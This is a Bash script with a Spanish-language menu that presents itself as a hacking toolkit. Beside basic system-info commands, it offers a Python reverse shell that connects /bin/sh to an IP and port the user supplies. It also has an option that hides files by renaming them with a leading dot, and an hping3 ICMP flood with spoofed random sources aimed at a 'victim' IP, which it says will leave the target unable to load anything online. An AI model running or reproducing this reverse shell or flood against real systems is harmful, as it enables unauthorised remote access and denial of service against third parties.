#!bin/bash

clearscr(){

clear

}

clearscr
while true 
do
	
	echo -e "
	
	$(tput setaf 2)
	View Info       	command			hacking 		
	
	$(tput setaf 7)
	1 = kernel	        7 = ls			15 = portforwarding
	2 = info_cpu		8 = comando manual	16 = ocultar archivos
        3 = info hardware	9 = pwd			17 = atack DOS
	4 = view users		10 = clear		18 = atack DDOS
	5 = view version OS	11 = whoami	
	6 = view IP
				99 = exit menu
"
echo "$(tput setaf 3)Introduzca aqui el numero de comando que desea ejecutar > $(tput setaf 7) " && read -p "> " option

	      
	case $option in  

     		99) exit ;;
		9) pwd ;;  	
		7) ls ;;
		6) ifconfig ;;
		1) uname -a ;;
		2) lscpu ;;
		8) echo "Introzca comando manualmente > " read -p "> " comando && $comando ;;
		11) whoami ;;
		3) dmidecode ;;
		4) who -a ;;
		5) cat /proc/version ;;
		10) clear ;;
		15) echo "Con esta opcion puedes reedirigir la conexion reversa hacia otro dispositivo en escucha" && read -p "Introduzca la IP que a la que quiere conectar a la victima > " ip && echo "Escriba el puerto al que quieres reedirigir la sesion" && read -p "> " puerto && python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$ip'",'$puerto'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ;;
		16) echo "escribe el nombre del archivo que quiere ocultar> " && read -p "> " hidden  && mv $hidden "."$hidden ;;
		17) echo "Introduzca la IP que realizarÃ¡ ping la maquina victima > " && read -p "> " ping && ping $ping ;;
		18) echo "Introduzca la IP de la victima a recibir un ataque DDOS > " && read -p "> " ddos && hping3 --icmp --rand-source --flood -d 1400 $ddos && echo "ESPERE 1-2 MINUTOS PARA QUE EL ATAQUE RESULTE EFECTIVO" && echo "DESPUES DE ESTE TIEMPO EL DISPOSITIVO VICTIMA ESTARÃ RELENTIZADO Y NO PUEDE CARGAR NINGUNA PAGINA O APLICACIÃ“N ONLINE " ;;
	
		*) echo "$(tput setaf 1)El numero no coincide con ninguna opciÃ³n. $(tput setaf 7)"
	esac
done 

